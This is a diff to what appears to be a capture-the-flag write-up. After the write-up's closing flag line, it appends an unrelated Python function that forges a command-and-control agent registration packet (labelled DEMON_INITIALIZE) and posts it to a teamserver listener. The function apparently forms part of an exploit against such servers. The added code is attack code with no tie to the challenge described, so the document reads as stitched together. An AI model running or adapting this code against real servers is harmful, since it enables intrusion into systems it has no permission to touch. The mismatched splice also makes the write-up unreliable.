@@ -92,3 +92,33 @@ HTB{un0bfu5c4t3d_5tr1ng5}
 ```
 
 And just like that we have our flag: `HTB{un0bfu5c4t3d_5tr1ng5}`!
+
+```python
+def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
+    # DEMON_INITIALIZE / 99
+    command = b"\x00\x00\x00\x63"
+    request_id = b"\x00\x00\x00\x01"
+    demon_id = agent_id
+
+    hostname_length = int_to_bytes(len(hostname))
+    username_length = int_to_bytes(len(username))
+    domain_name_length = int_to_bytes(len(domain_name))
+    internal_ip_length = int_to_bytes(len(internal_ip))
+    process_name_length = int_to_bytes(len(process_name) - 6)
+
+    data =  b"\xab" * 100
+
+    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data
+
+    size = 12 + len(header_data)
+    size_bytes = size.to_bytes(4, 'big')
+    agent_header = size_bytes + magic + agent_id
+
+    print("[***] Trying to register agent...")
+    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
+    if r.status_code == 200:
+        print("[***] Success!")
+    else:
+        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")
+
+```
